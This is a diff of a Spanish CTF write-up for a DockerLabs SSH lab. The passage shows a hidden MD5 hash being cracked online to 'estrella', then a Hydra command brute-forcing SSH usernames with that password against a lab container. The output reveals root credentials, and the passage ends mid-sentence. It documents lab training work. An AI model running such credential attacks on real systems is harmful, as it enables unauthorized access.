@@ -233,4 +233,24 @@ lovely@90f44a27e698:/$ ls -a /opt
 lovely@90f44a27e698:/$ cat opt/.hash
 aa87ddc5b4c24406d26ddad771ef44b0
 ```
-Trasteando un poco nos encontramos con un fichero oculto llamado *hash*, el cual, si lo inspeccionamos, contendrá lo que parece un hash.  Lo copiamos y nos dirigiremos a la web de [CarckStation](https://crackstation.net/) y descrackemos el hash.  Como resultado nos dará que es un hash hecho con un algoritmo md5 y oculta la palabra *estrella*.
+Trasteando un poco nos encontramos con un fichero oculto llamado *.hash*, el cual, si lo inspeccionamos, contendrá lo que parece un hash.  Lo copiamos y nos dirigiremos a la web de [CarckStation](https://crackstation.net/) y descrackemos el hash.  Como resultado nos dará que es un hash hecho con un algoritmo md5 y oculta la palabra *estrella*. ![CrackStation](https://github.com/JavieRR13/WriteUps/blob/2be3675a25197e4f1ce663fb2091422907aa2746/DockerLabs/Muy%20f%C3%A1cil/BreackMySSH/Im%C3%A1genes/BMSSH_CrackStation.png)
+Ya con la contraseña guardada, utilizaremos [Hydra](https://github.com/vanhauser-thc/thc-hydra) pero esta vez para adivinar un posible usuario al que pertenezca dicha contraseña.  
+```ruby
+❯ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p estrella -f ssh://172.17.0.2
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 21:37:13
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: root   password: estrella
+[STATUS] attack finished for 172.17.0.2 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 21:37:25
+```
+* Con -L indicamos que el usuario se va a proporcionar por una lista.
+* Con -p inidcamos la password.
+* Con -f indicamos que finalice la ejecución una vez encuentre un parámetro válido.
+
+Como respuesta nos hemos encontrado con que el usuario *root*
